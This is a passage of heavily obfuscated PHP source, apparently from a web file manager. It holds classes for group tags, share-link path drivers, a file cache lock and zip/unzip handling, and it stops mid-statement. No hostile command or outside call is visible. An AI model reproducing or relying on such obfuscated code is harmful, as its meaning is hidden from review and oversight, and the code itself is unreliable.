$ÃÜçš÷”[180] => 0, $ÃÜçš÷”[462] => 1, $ÃÜçš÷”[547] => array($ÃÜçš÷”[7], array($¬Ï›¢Ñ, $’Ë”·İÕ))); $µµå›»¯ = Model($ÃÜçš÷”[878])->where($ÏĞ¤¾¾¹)->field($ÃÜçš÷”[2002])->select(); $µµå›»¯ = array_to_keyvalue($µµå›»¯, $ÃÜçš÷”[547], $ÃÜçš÷”[181]); $ÚäØ½Ò‡ = !empty($µµå›»¯[$¬Ï›¢Ñ]) ? $µµå›»¯[$¬Ï›¢Ñ] : !1; if ($ÚäØ½Ò‡) { if (!$µµå›»¯[$’Ë”·İÕ]) { $µµå›»¯[$’Ë”·İÕ] = Model($ÃÜçš÷”[878])->groupRootAdd($’Ë”·İÕ); } $ÛÂƒÃª¿ = $µµå›»¯[$’Ë”·İÕ]; $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[180] => $ÚäØ½Ò‡); $µµå›»¯ = Model($ÃÜçš÷”[878])->where($ÏĞ¤¾¾¹)->field($ÃÜçš÷”[2003])->select(); if (!$µµå›»¯) { $µµå›»¯ = array(); } Model($ÃÜçš÷”[878])->moveClearAuth = !1; foreach ($µµå›»¯ as $çò°ÄÛî) { $¯è§’› = $çò°ÄÛî[$ÃÜçš÷”[462]] == $ÃÜçš÷”[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÃÜçš÷”[878])->move($çò°ÄÛî[$ÃÜçš÷”[181]], $ÛÂƒÃª¿, $¯è§’›); } Model($ÃÜçš÷”[878])->moveClearAuth = !0; $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[178] => 2, $ÃÜçš÷”[547] => $¬Ï›¢Ñ); $Í¥¥”‹ = array($ÃÜçš÷”[547] => $’Ë”·İÕ); Model($ÃÜçš÷”[2004])->where($ÏĞ¤¾¾¹)->save($Í¥¥”‹); Model($ÃÜçš÷”[2005])->where($ÏĞ¤¾¾¹)->save($Í¥¥”‹); } $this->_changeChildLevel($š¿©¥Ë[$¬Ï›¢Ñ], $š¿©¥Ë[$’Ë”·İÕ], !0); $this->where(array($ÃÜçš÷”[180] => $¬Ï›¢Ñ))->save(array($ÃÜçš÷”[180] => $’Ë”·İÕ)); $this->_clearChildrenCache($š¿©¥Ë[$’Ë”·İÕ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($Ãé·ÜÔ) { $¤šĞí”ú =& $_SERVER[Ö†ØøÖ±]; return array($¤šĞí”ú[2006] => array($Ãé·ÜÔ[0], $¤šĞí”ú[2007]), $¤šĞí”ú[2008] => array($Ãé·ÜÔ[0], $¤šĞí”ú[2009])); } protected function get($×æ‚²¿) { $ê“ìÔäÑ =& $_SERVER[Ö†ØøÖ±]; $ˆüÄÁ¿Í = Model($ê“ìÔäÑ[563])->metaGet($×æ‚²¿, $ê“ìÔäÑ[2010]); $††×Şê¸ = json_decode($ˆüÄÁ¿Í, !0); return $††×Şê¸ ? $††×Şê¸ : array($ê“ìÔäÑ[2011] => $ê“ìÔäÑ[88], $ê“ìÔäÑ[422] => array()); } protected function set($”ñşÍ¿¼, $¢éŒù) { $±î´ûĞ¦ =& $_SERVER[Ö†ØøÖ±]; $¢éŒù = $¢éŒù ? $¢éŒù : array($±î´ûĞ¦[2011] => $±î´ûĞ¦[88], $±î´ûĞ¦[422] => array()); return Model($±î´ûĞ¦[563])->metaSet($”ñşÍ¿¼, $±î´ûĞ¦[2010], json_encode($¢éŒù)); } protected function getByTagID($“Æ˜°¤›, $œ¨ŸºëÚ) { $±éÁ¯â¦ =& $_SERVER[Ö†ØøÖ±]; if (!$“Æ˜°¤› || !$œ¨ŸºëÚ) { return !1; } if (!Model($±éÁ¯â¦[563])->getInfoSimple($“Æ˜°¤›)) { return !1; } $»·Ç÷Â = $this->get($“Æ˜°¤›); if (!$»·Ç÷Â || !isset($»·Ç÷Â[$±éÁ¯â¦[422]])) { return !1; } $İä± “² = array_find_by_field($»·Ç÷Â[$±éÁ¯â¦[422]], $±éÁ¯â¦[451], $œ¨ŸºëÚ); return is_array($İä± “²) ? $İä± “² : !1; } public function listSource($¡‘¿Àı, $Ø†€•¬Ô) { $î´Éç¸ =& $_SERVER[Ö†ØøÖ±]; if ($Ø†€•¬Ô && !is_array($Ø†€•¬Ô)) { $Ø†€•¬Ô = array($Ø†€•¬Ô); } $ØâŸ×ìõ = $this->listData($¡‘¿Àı); $ùóşÒîº = array(); foreach ($ØâŸ×ìõ as $Œ»ßÆø§) { $è°ËòŞô = $Œ»ßÆø§[$î´Éç¸[84]]; if (!$è°ËòŞô) { continue; } if (!isset($ùóşÒîº[$è°ËòŞô])) { $ùóşÒîº[$è°ËòŞô] = array(); } $ùóşÒîº[$è°ËòŞô][] = $Œ»ßÆø§[$î´Éç¸[477]]; } $âŸ¼ÆòÃ = array(); foreach ($ùóşÒîº as $ğéÄ™ => $»Ú£¢«) { $’”¨÷ù = !0; if (!$Ø†€•¬Ô) { $âŸ¼ÆòÃ[] = $ğéÄ™; continue; } foreach ($Ø†€•¬Ô as $ô›Öá²) { if (!in_array($ô›Öá², $»Ú£¢«)) { $’”¨÷ù = !1; break; } } if ($’”¨÷ù) { $âŸ¼ÆòÃ[] = $ğéÄ™; } } if (!$âŸ¼ÆòÃ) { return array(); } $‡Ø¨©„ = array($î´Éç¸[468] => array($î´Éç¸[469], $âŸ¼ÆòÃ), $î´Éç¸[547] => $¡‘¿Àı, $î´Éç¸[178] => SourceModel::TYPE_GROUP); $ä×ö¢ò“ = Model($î´Éç¸[1385])->listSource($‡Ø¨©„); if (!$ä×ö¢ò“ || count($âŸ¼ÆòÃ) == $ä×ö¢ò“[$î´Éç¸[419]][$î´Éç¸[420]]) { return $ä×ö¢ò“; } $àûçÉ¶ì = array(); $Šãä¢™à = array_to_keyvalue($ä×ö¢ò“[$î´Éç¸[82]], $î´Éç¸[12], $î´Éç¸[181]); $¶ƒÊ¼ê = array_to_keyvalue($ä×ö¢ò“[$î´Éç¸[83]], $î´Éç¸[12], $î´Éç¸[181]); $ˆˆæåéà = array_merge($¶ƒÊ¼ê, $Šãä¢™à); foreach ($âŸ¼ÆòÃ as $è°ËòŞô) { if (!in_array($è°ËòŞô, $ˆˆæåéà)) { $àûçÉ¶ì[] = $è°ËòŞô; } } if ($àûçÉ¶ì) { $this->removeBySource($¡‘¿Àı, $àûçÉ¶ì); } return $ä×ö¢ò“; } protected function listData($Œ©¥ÒÇ) { $ÈŒÉßÔà =& $_SERVER[Ö†ØøÖ±]; $Ò°›£¬ˆ = array($ÈŒÉßÔà[1690] => 0, $ÈŒÉßÔà[534] => array($ÈŒÉßÔà[2012], 0), $ÈŒÉßÔà[473] => $ÈŒÉßÔà[2013] . $Œ©¥ÒÇ); $Î ÊĞ–Š = $ÈŒÉßÔà[2014]; $ë‰ëÊ×ò = $this->field($Î ÊĞ–Š)->where($Ò°›£¬ˆ)->order($ÈŒÉßÔà[2015])->select(); return $ë‰ëÊ×ò ? $ë‰ëÊ×ò : array(); } protected function addToTag($éÉŠÎ¥ó, $ı‚¦¬µĞ, $½ÈÊªÄß) { $ıæ‹ ×Ÿ =& $_SERVER[Ö†ØøÖ±]; if (!$this->getByTagID($éÉŠÎ¥ó, $½ÈÊªÄß) || !$ı‚¦¬µĞ) { return !1; } if (!Model($ıæ‹ ×Ÿ[878])->pathInfo($ı‚¦¬µĞ)) { return !1; } $„’Ì½ı = array($ıæ‹ ×Ÿ[1690] => 0, $ıæ‹ ×Ÿ[534] => $½ÈÊªÄß, $ıæ‹ ×Ÿ[472] => $ı‚¦¬µĞ, $ıæ‹ ×Ÿ[473] => $ıæ‹ ×Ÿ[2016] . $éÉŠÎ¥ó, $ıæ‹ ×Ÿ[471] => $ıæ‹ ×Ÿ[12], $ıæ‹ ×Ÿ[1901] => 0); if ($this->where($„’Ì½ı)->find()) { return !1; } return $this->add($„’Ì½ı); } protected function removeFromTag($®ˆ¤­ş, $ÑÉ½¬È , $ÙüÀµé) { $‰ÃÀ¿Ì =& $_SERVER[Ö†ØøÖ±]; if (!$this->getByTagID($®ˆ¤­ş, $ÙüÀµé) || !$ÑÉ½¬È ) { return !1; } if (is_array($ÑÉ½¬È )) { $ÑÉ½¬È  = array($‰ÃÀ¿Ì[7], $ÑÉ½¬È ); } $Ç›ØÕñ‚ = array($‰ÃÀ¿Ì[1690] => 0, $‰ÃÀ¿Ì[534] => $ÙüÀµé, $‰ÃÀ¿Ì[473] => $‰ÃÀ¿Ì[2016] . $®ˆ¤­ş, $‰ÃÀ¿Ì[472] => $ÑÉ½¬È ); return $this->where($Ç›ØÕñ‚)->delete(); } protected function removeByTag($‚åã«Ğ, $Ôõ÷‚ı€) { $¼ÌùĞæ­ =& $_SERVER[Ö†ØøÖ±]; if (!$this->getByTagID($‚åã«Ğ, $Ôõ÷‚ı€)) { return !1; } $¨É¡Ş¬£ = array($¼ÌùĞæ­[1690] => 0, $¼ÌùĞæ­[534] => $Ôõ÷‚ı€, $¼ÌùĞæ­[473] => $¼ÌùĞæ­[2016] . $‚åã«Ğ); return $this->where($¨É¡Ş¬£)->delete(); } protected function removeBySource($¢ÉŠÈâã, $½î½£å) { $¦¼ôÕÃ« =& $_SERVER[Ö†ØøÖ±]; if (!$¢ÉŠÈâã || !$½î½£å) { return !1; } if (is_array($½î½£å)) { $½î½£å = array($¦¼ôÕÃ«[7], $½î½£å); } $ÌŠÈšüÆ = array($¦¼ôÕÃ«[1690] => 0, $¦¼ôÕÃ«[472] => $½î½£å, $¦¼ôÕÃ«[534] => array($¦¼ôÕÃ«[1067], 0), $¦¼ôÕÃ«[473] => $¦¼ôÕÃ«[2016] . $¢ÉŠÈâã); return $this->where($ÌŠÈšüÆ)->delete(); } } goto e”¯µ§©»£; b£ğ°Èáá: class PathDriverDbShareLink extends PathDriverDB { public function __construct($µİ‚Üİ) { $this->pathParse = $µİ‚Üİ; $this->model = Model($_SERVER[Ö†ØøÖ±][1385]); } protected function infoParse($€ÉµÜŒÑ, $ı½ßÒå‚ = false, $˜¯â”Ÿ— = false) { $ƒì¿íÛ® =& $_SERVER[Ö†ØøÖ±]; return Action($ƒì¿íÛ®[1227])->sharePathInfo($this->pathParse[$ƒì¿íÛ®[84]], !0, $ı½ßÒå‚); } public function listPath($’”ï˜®…, $ò³æñô = false) { $˜ßÉ’ıÁ =& $_SERVER[Ö†ØøÖ±]; $˜¾õ•Ÿ = parent::listPath($’”ï˜®…, $ò³æñô); if (!$˜¾õ•Ÿ) { return $˜¾õ•Ÿ; } if (is_array($˜¾õ•Ÿ[$˜ßÉ’ıÁ[1393]])) { $˜¾õ•Ÿ[$˜ßÉ’ıÁ[1393]] = Action($˜ßÉ’ıÁ[1227])->shareItemInfo($˜¾õ•Ÿ[$˜ßÉ’ıÁ[1393]]); } foreach ($˜¾õ•Ÿ as $’Üìèë§ => $¤õ®ÙÒğ) { if (!in_array($’Üìèë§, array($˜ßÉ’ıÁ[83], $˜ßÉ’ıÁ[82]))) { continue; } foreach ($¤õ®ÙÒğ as $¹Ş·»ƒ¸ => $ô“í‰Éß) { $˜¾õ•Ÿ[$’Üìèë§][$¹Ş·»ƒ¸] = Action($˜ßÉ’ıÁ[1227])->shareItemInfo($ô“í‰Éß); } } return $˜¾õ•Ÿ; } public function listAll($¥‰¡‡ï‘) { $Â¹á­ò© =& $_SERVER[Ö†ØøÖ±]; $Ô˜şï–È = IO::info($this->pathParse[$Â¹á­ò©[84]]); if (!$Ô˜şï–È) { return array(); } $Ùú»€±ƒ = $this->model->listAll($¥‰¡‡ï‘); foreach ($Ùú»€±ƒ as &$®„Åç»µ) { $®„Åç»µ[$Â¹á­ò©[87]] = Action($Â¹á­ò©[1227])->shareItemInfo($®„Åç»µ[$Â¹á­ò©[87]]); } unset($®„Åç»µ); return $Ùú»€±ƒ; } } class PathDriverDriverShareItem { public function __construct($¶Öóğö) { $this->pathParse = $¶Öóğö; } public function __call($âÑúë¿õ, $²°À»±Ë) { $©‹òˆª¤ =& $_SERVER[Ö†ØøÖ±]; if (method_exists($this, $âÑúë¿õ)) { return; } $Ì„Š–ª« = call_user_func_array(array($©‹òˆª¤[1394], $âÑúë¿õ), $²°À»±Ë); $ıõ¡Ü¼ = array($©‹òˆª¤[1395], $©‹òˆª¤[1396], $©‹òˆª¤[1397], $©‹òˆª¤[1398], $©‹òˆª¤[595], $©‹òˆª¤[597], $©‹òˆª¤[1399], $©‹òˆª¤[107], $©‹òˆª¤[1400], $©‹òˆª¤[1401]); if (in_array($âÑúë¿õ, $ıõ¡Ü¼)) { $Ì„Š–ª« = $this->getPathOuter($Ì„Š–ª«); } return $Ì„Š–ª«; } public function copy($Ñ§£Îå, $ªˆ™ÒÛØ, $ŒÀ©Ú·Ê = false, $ÛŒÈŞ±è = false) { return $this->copyMove($Ñ§£Îå, $ªˆ™ÒÛØ, $ŒÀ©Ú·Ê, $_SERVER[Ö†ØøÖ±][595], $ÛŒÈŞ±è); } public function move($®…›ÊŒ£, $–¹İóâ, $‘¡™±Ÿô = false, $§ÌÍÃşæ = false) { return $this->copyMove($®…›ÊŒ£, $–¹İóâ, $‘¡™±Ÿô, $_SERVER[Ö†ØøÖ±][597], $§ÌÍÃşæ); } private function copyMove($İ²©Ï›à, $­Ìšµ, $àúÅ¹Ø, $èÜõÛè, $ÀÆä‰µ· = false) { $¢óÖ—ç· =& $_SERVER[Ö†ØøÖ±]; $ª—¢óÁØ = $­Ìšµ; $±…’¶í† = IO::driverMake($­Ìšµ); if ($±…’¶í†->pathParse[$¢óÖ—ç·[1204]]) { $­Ìšµ = $±…’¶í†->pathParse[$¢óÖ—ç·[1204]]; } else { $­Ìšµ = $ª—¢óÁØ; } $Ş–©ıĞ¼ = IO::copyMove($İ²©Ï›à, $­Ìšµ, $àúÅ¹Ø, $èÜõÛè, $ÀÆä‰µ·); $Ş–©ıĞ¼ = $this->getPathOuter($Ş–©ıĞ¼); return $Ş–©ıĞ¼; } public function pathThis($Ìõ³§Î›) { return get_path_this($this->pathParse[$_SERVER[Ö†ØøÖ±][84]]); } public function pathFather($ÄÉñˆ«¦) { return get_path_father($this->pathParse[$_SERVER[Ö†ØøÖ±][84]]); } public function iconvSystem($Ë†ç­—¡) { return $Ë†ç­—¡; } protected function infoParse($Ğ¡ô¶„, $şŒêä± = false) { $ÇªœÎ˜Ê =& $_SERVER[Ö†ØøÖ±]; $³¬ìô¸ = $this->pathParse[$ÇªœÎ˜Ê[537]][$ÇªœÎ˜Ê[1228]] . $this->pathParse[$ÇªœÎ˜Ê[1221]]; if ($şŒêä±) { $·ûÜì = IO::infoWithChildren($³¬ìô¸); } else { $·ûÜì = IO::info($³¬ìô¸); } $†­ƒŠ‚· = $this->pathParse[$ÇªœÎ˜Ê[537]]; return Action($ÇªœÎ˜Ê[1392])->_shareItemeParse($·ûÜì, $†­ƒŠ‚·); } public function listAll($Õº¸î¦¦) { $´Õ‰Øİş =& $_SERVER[Ö†ØøÖ±]; $Á®ƒ¬É™ = IO::listAll($Õº¸î¦¦); $ƒÆç×”¸ = rtrim($this->pathParse[$´Õ‰Øİş[537]][$´Õ‰Øİş[1228]], $´Õ‰Øİş[8]); foreach ($Á®ƒ¬É™ as &$ÒöØïÆ) { $ÒöØïÆ[$´Õ‰Øİş[84]] = $this->pathDriver . $´Õ‰Øİş[8] . ltrim(substr($ÒöØïÆ[$´Õ‰Øİş[84]], strlen($ƒÆç×”¸)), $´Õ‰Øİş[8]); } unset($ÒöØïÆ); return $Á®ƒ¬É™; } public function listAllSimple($§á×‰¬, $Å‘Ö¬æ¸ = false) { $®üş¢×Ç =& $_SERVER[Ö†ØøÖ±]; $ìÖ¶èÉÌ = $this->listAll($§á×‰¬); $½óœï = $this->pathParse[$®üş¢×Ç[472]]; if (trim($½óœï, $®üş¢×Ç[8]) == trim(get_path_father($½óœï), $®üş¢×Ç[8])) { $Å‘Ö¬æ¸ = !0; } return IO::init($®üş¢×Ç[12])->listAllSimpleMake($ìÖ¶èÉÌ, $½óœï, $Å‘Ö¬æ¸); } public function getPathOuter($äÈä®Äú) { $²÷³¬ô˜ =& $_SERVER[Ö†ØøÖ±]; $Üƒ°ïáˆ = KodIO::parse($äÈä®Äú); if ($Üƒ°ïáˆ[$²÷³¬ô˜[33]] == KodIO::KOD_SHARE_ITEM) { return $Üƒ°ïáˆ[$²÷³¬ô˜[84]]; } $² ÎŠ³á = KodIO::clear($äÈä®Äú); $ì×½ÃÛ· = KodIO::clear($this->pathParse[$²÷³¬ô˜[537]][$²÷³¬ô˜[1228]]); $éÈü˜ê– = substr($² ÎŠ³á, strlen($ì×½ÃÛ·)); if (substr($² ÎŠ³á, 0, strlen($ì×½ÃÛ·)) != $ì×½ÃÛ·) { return !1; } return $this->pathParse[$²÷³¬ô˜[1222]] . $²÷³¬ô˜[8] . ltrim($éÈü˜ê–, $²÷³¬ô˜[8]); } public function getType() { $«âŠùóê =& $_SERVER[Ö†ØøÖ±]; $èöÏâ‰Ä = str_replace($«âŠùóê[74], $«âŠùóê[12], get_class($this)); return strtolower($èöÏâ‰Ä); } public function isTypeObject($á–æ¹²¶) { return IO::isTypeObject($á–æ¹²¶); } public function info($²‹Æ¸ªŸ) { return $this->infoParse($²‹Æ¸ªŸ); } public function infoAuth($Ê¬ë¤˜×) { return $this->infoParse($Ê¬ë¤˜×); } public function infoWithChildren($’İÙüÕ) { return $this->infoParse($’İÙüÕ, !0); } public function infoFull($Å‰ãÂçü) { return $this->infoParse($Å‰ãÂçü); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¦©™Ö²¯) { $this->pathParse = $¦©™Ö²¯; } protected function infoParse($ƒé½šé, $ı”¢Ğï = false) { $ÕƒÊ¼À¡ =& $_SERVER[Ö†ØøÖ±]; return Action($ÕƒÊ¼À¡[1227])->sharePathInfo($this->pathParse[$ÕƒÊ¼À¡[84]], !0, $ı”¢Ğï); } public function listPath($ä“Ä°Ó, $ÚÍèã› = false) { $Ò¹şüÙ§ =& $_SERVER[Ö†ØøÖ±]; $üÛéìÓ = IO::listPath($ä“Ä°Ó, $ÚÍèã›); if (!$üÛéìÓ) { return $üÛéìÓ; } if (is_array($üÛéìÓ[$Ò¹şüÙ§[1393]])) { $§¸ÊıÔ‡ = Action($Ò¹şüÙ§[1402])->parsePathChildren($üÛéìÓ[$Ò¹şüÙ§[1393]], array($Ò¹şüÙ§[472] => $ä“Ä°Ó)); $üÛéìÓ[$Ò¹şüÙ§[1393]] = Action($Ò¹şüÙ§[1227])->shareItemInfo($§¸ÊıÔ‡); } foreach ($üÛéìÓ as $ï€†Æµ => $¸şüµÄ) { if (!in_array($ï€†Æµ, array($Ò¹şüÙ§[83], $Ò¹şüÙ§[82]))) { continue; } foreach ($¸şüµÄ as $ÏÁÏ¡ĞÖ => $§¸ÊıÔ‡) { $§¸ÊıÔ‡ = Action($Ò¹şüÙ§[1402])->parsePathChildren($§¸ÊıÔ‡, array($Ò¹şüÙ§[472] => $ä“Ä°Ó)); $üÛéìÓ[$ï€†Æµ][$ÏÁÏ¡ĞÖ] = Action($Ò¹şüÙ§[1227])->shareItemInfo($§¸ÊıÔ‡); } } return $üÛéìÓ; } } goto FÀ™İ’ê‰á; fÄ¨„ ŠÆ¼: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $–£êû˜­ =& $_SERVER[Ö†ØøÖ±]; $ƒ”òÒ–Ğ = $GLOBALS[$–£êû˜­[6]][$–£êû˜­[402]]; self::$cachePath = $ƒ”òÒ–Ğ[$–£êû˜­[214]][$–£êû˜­[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ûª´äá», $âÅ’•ñÑ = 0) { $ãÏÚ«ê =& $_SERVER[Ö†ØøÖ±]; $Á®«ğÒ = microtime(!0); $æ®º”Ô = $Á®«ğÒ + $âÅ’•ñÑ + 0.0001; $­’ñÅø¢ = rtrim(self::$cachePath, $ãÏÚ«ê[8]) . $ãÏÚ«ê[917] . md5($Ûª´äá») . $ãÏÚ«ê[914]; if (file_exists($­’ñÅø¢) && filemtime($­’ñÅø¢) && filemtime($­’ñÅø¢) < time() - 10) { @unlink($­’ñÅø¢); } do { if (file_exists($­’ñÅø¢)) { cacheLockWait(); continue; } $Ş²ˆ¥Õò = fopen($­’ñÅø¢, $ãÏÚ«ê[918]); if (!$Ş²ˆ¥Õò) { return !1; } $ƒÚ¼¨‰ü = flock($Ş²ˆ¥Õò, LOCK_EX | LOCK_NB); self::$caches[$Ûª´äá»] = array($ãÏÚ«ê[919] => $Ş²ˆ¥Õò, $ãÏÚ«ê[214] => $­’ñÅø¢); fwrite($Ş²ˆ¥Õò, $æ®º”Ô); clearstatcache(); if ($Ş²ˆ¥Õò && $ƒÚ¼¨‰ü) { return !0; } cacheLockWait(); } while (microtime(!0) < $æ®º”Ô); $this->unlock($Ûª´äá»); return !1; } public function lockGet($ĞÏ›—¸) { $Ì×ßüÌ¯ =& $_SERVER[Ö†ØøÖ±]; $ìÈëªâ† = rtrim(self::$cachePath, $Ì×ßüÌ¯[8]) . $Ì×ßüÌ¯[917] . md5($ĞÏ›—¸) . $Ì×ßüÌ¯[914]; return file_exists($ìÈëªâ†); } public function unlock($ı®íÊÀ‹) { $ Ãèş¿ =& $_SERVER[Ö†ØøÖ±]; $Ô“ï‡ì = self::$caches[$ı®íÊÀ‹]; if (!$Ô“ï‡ì) { return; } @flock($Ô“ï‡ì[$ Ãèş¿[919]], LOCK_UN); @fclose($Ô“ï‡ì[$ Ãèş¿[919]]); @unlink($Ô“ï‡ì[$ Ãèş¿[214]]); unset(self::$caches[$ı®íÊÀ‹]); } } $_file = $_SERVER[$_SERVER[Ö†ØøÖ±][289]]; $_size = $_SERVER[Ö†ØøÖ±][452]; goto c²èğê‰¡; D¨“¥œŒÜ­: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $»àËÇ Ï; if ($»àËÇ Ï) { return $»àËÇ Ï; } $ğäğ½Ø‹ = IO::init($_SERVER[Ö†ØøÖ±][8]); return $ğäğ½Ø‹; } private static function iconvSystem($ãí›‘Èª) { return self::local()->iconvSystem($ãí›‘Èª); } private static function iconvApp($æ¥«’â¾) { return self::local()->iconvApp($æ¥«’â¾); } public static function zipFolder($Ğì—Ñ¦°, $Ûşñ¸£ï = "\172\x69\x70", $²ÕİÇï¼ = '', $ñûË•şÎ = REPEAT_RENAME) { $â§…ò‡İ =& $_SERVER[Ö†ØøÖ±]; $¼¾àÓâÉ = IO::listPath($Ğì—Ñ¦°); if (!$¼¾àÓâÉ) { return !1; } $¼¾àÓâÉ = array_merge($¼¾àÓâÉ[$â§…ò‡İ[82]], $¼¾àÓâÉ[$â§…ò‡İ[83]]); return self::zip($¼¾àÓâÉ, $Ûşñ¸£ï, $²ÕİÇï¼, $ñûË•şÎ); } public static function zip($û§¦ºëƒ, $‹¤¼ê«å = "\172\151\160", $—Â½ä‚ù = '', $œ¬¸¡›è = REPEAT_RENAME) { $¥£ò¼İ =& $_SERVER[Ö†ØøÖ±]; if (is_string($û§¦ºëƒ) && $û§¦ºëƒ) { $û§¦ºëƒ = array(array($¥£ò¼İ[84] => $û§¦ºëƒ)); } $¶æ¼¦Á = self::init($û§¦ºëƒ[0][$¥£ò¼İ[84]]); $ê‡ô–ûº = self::info($û§¦ºëƒ[0][$¥£ò¼İ[84]]); $†ğúÎ„¦ = $¥£ò¼İ[12]; $ğ ¶àè® = $¥£ò¼İ[12]; $âÁùÅ‰ = $¥£ò¼İ[12]; if ($—Â½ä‚ù && substr($—Â½ä‚ù, -1, 1) != $¥£ò¼İ[8]) { $ğ ¶àè® = get_path_father($—Â½ä‚ù); $âÁùÅ‰ = get_path_this($—Â½ä‚ù); } else { $ğ ¶àè® = self::pathFather($ê‡ô–ûº[$¥£ò¼İ[84]]); $âÁùÅ‰ = $ê‡ô–ûº[$¥£ò¼İ[32]] . $¥£ò¼İ[10] . $‹¤¼ê«å; if (count($û§¦ºëƒ) > 1) { $ú’›×” = IO::info($ğ ¶àè®); $âÁùÅ‰ = $ú’›×”[$¥£ò¼İ[32]] . $¥£ò¼İ[10] . $‹¤¼ê«å; } if ($—Â½ä‚ù) { $ğ ¶àè® = $—Â½ä‚ù; } } if ($¶æ¼¦Á->getType() == $¥£ò¼İ[106]) { $çí®­¼… = self::init($ğ ¶àè®); $Šış‘Â = $çí®­¼…->getType() == $¥£ò¼İ[106] ? $ğ ¶àè® : get_path_father($¶æ¼¦Á->path); $Šış‘Â = rtrim($Šış‘Â, $¥£ò¼İ[8]) . $¥£ò¼İ[8]; mk_dir($Šış‘Â); } else { $†ğúÎ„¦ = TEMP_FILES . $¥£ò¼İ[1236] . time() . rand_string(8) . $¥£ò¼İ[8]; mk_dir($†ğúÎ„¦); file_put_contents($†ğúÎ„¦ . $¥£ò¼İ[1237], $¥£ò¼İ[12]); $Šış‘Â = $†ğúÎ„¦; } $È×¢¯¦º = IO::info($Šış‘Â); if (!$È×¢¯¦º || !$È×¢¯¦º[$¥£ò¼İ[217]]) { show_json(LNG($¥£ò¼İ[1238]), !1); } $È£²Ôî³ = self::zipFileList($û§¦ºëƒ, $†ğúÎ„¦); foreach ($È£²Ôî³ as $¾Ù”Ğ‹è => $ïêäæÛŒ) { $È£²Ôî³[$¾Ù”Ğ‹è] = self::iconvSystem($ïêäæÛŒ); } $çÂ¦£’ş = get_filename_auto($Šış‘Â . $âÁùÅ‰, $¥£ò¼İ[12], $œ¬¸¡›è); KodArchive::create(self::iconvSystem($çÂ¦£’ş), $È£²Ôî³); if (!IO::exist($çÂ¦£’ş)) { if ($†ğúÎ„¦) { del_dir($†ğúÎ„¦); } show_json(LNG($¥£ò¼İ[1239]), !1); } if (!$†ğúÎ„¦) { return $çÂ¦£’ş; } $³˜”Å‚è = self::move($çÂ¦£’ş, $ğ ¶àè®, $œ¬¸¡›è); if ($†ğúÎ„¦) { del_dir($†ğúÎ„¦); } if (!$çÂ¦£’ş) { show_json(LNG($¥£ò¼İ[1239]), !1); } return $³˜”Å‚è; } public static function unzip($ŞÉ‰ĞóÉ, $Íşœé, $ÏğƒÙñ = "\55\x31", $œ½¢‘»¶ = "\x72\145\160\x6c\141\143\145") { $£²ûÂ÷¹ =& $_SERVER[Ö†ØøÖ±]; $èÅÇŸ© = parent::info($ŞÉ‰ĞóÉ); if (!$èÅÇŸ©) { show_json(LNG($£²ûÂ÷¹[1240]), !1); } $ÎÚÜòÔó = IO::infoFullSimple($Íşœé); if (!$ÎÚÜòÔó) { $Íşœé = IO::mkdir($Íşœé); } if (isset($ÎÚÜòÔó[$£²ûÂ÷¹[181]]) && trim($ÎÚÜòÔó[$£²ûÂ÷¹[84]], $£²ûÂ÷¹[8]) != trim($Íşœé, $£²ûÂ÷¹[8])) { $å–Ô×öÚ = KodIO::make($ÎÚÜòÔó[$£²ûÂ÷¹[180]]); $³›é£ôÆ = IO::fileNameAuto($å–Ô×öÚ, $ÎÚÜòÔó[$£²ûÂ÷¹[32]], REPEAT_RENAME_FOLDER, !0); $Íşœé = IO::mkdir($å–Ô×öÚ . $³›é£ôÆ); } $ÏğƒÙñ = $ÏğƒÙñ && $ÏğƒÙñ != $£²ûÂ÷¹[1241] ? @json_decode($ÏğƒÙñ, !0) : -1; $¶ª‚­ñ = self::unzipPart($ŞÉ‰ĞóÉ, $ÏğƒÙñ); if (!$¶ª‚­ñ || !IO::exist($¶ª‚­ñ[$£²ûÂ÷¹[214]])) { show_json(LNG($£²ûÂ÷¹[105]), !1); } $ìäØÂÊË = $¶ª‚­ñ[$£²ûÂ÷¹[1242]][count($¶ª‚­ñ[$£²ûÂ÷¹[1242]]) - 1]; if ($ìäØÂÊË[$£²ûÂ÷¹[1243]] == -1 || substr($ìäØÂÊË[$£²ûÂ÷¹[32]], -1, 1) == $£²ûÂ÷¹[8]) { $•”ß¯Á‘ = $¶ª‚­ñ[$£²ûÂ÷¹[1244]] . rand_string(10) . $£²ûÂ÷¹[8]; mk_dir($•”ß¯Á‘); $Ìíûì™Ï = count($¶ª‚­ñ[$£²ûÂ÷¹[1242]]) == 1 ? IO::ext($ŞÉ‰ĞóÉ) : get_path_ext($¶ª‚­ñ[$£²ûÂ÷¹[214]]); $‚éôÍê– = KodArchive::extract(self::iconvSystem($¶ª‚­ñ[$£²ûÂ÷¹[214]]), $•”ß¯Á‘, $ìäØÂÊË[$£²ûÂ÷¹[1243]], $³›é£ôÆ, $Ìíûì™Ï); self::unzipErrorCheck($‚éôÍê–, array($£²ûÂ÷¹[1245], $ŞÉ‰ĞóÉ, $Ìíûì™Ï, $Íşœé, $¶ª‚­ñ)); Hook::trigger($£²ûÂ÷¹[1246], $•”ß¯Á‘); recursion_dir($•”ß¯Á‘, $“¤·ƒ¿, $¨ÃíÔ¨, 0); $ä‘°òÕ = array_merge($“¤·ƒ¿, $¨ÃíÔ¨); $øÏüƒèŞ = array(); foreach ($ä‘°òÕ as $êÚ§¤Ùí) { $°ï Şª = IO::move(self::iconvApp($êÚ§¤Ùí), $Íşœé, $œ½¢‘»¶); if ($°ï Şª) { $øÏüƒèŞ[] = $°ï Şª; } } del_dir($•”ß¯Á‘); } else { $°ï Şª = IO::move($¶ª‚­ñ[$£²ûÂ÷¹[214]], $Íşœé, $œ½¢‘»¶, get_path_this($ìäØÂÊË[$£²ûÂ÷¹[32]])); if ($°ï Şª) { $øÏüƒèŞ[] = $°ï Şª; } } return $øÏüƒèŞ ? $øÏüƒèŞ : !1; } public static function unzipList($„­äêí³) { $à¢ÆËÌ† =& $_SERVER[Ö†ØøÖ±]; $õöÉŒ¥„ = 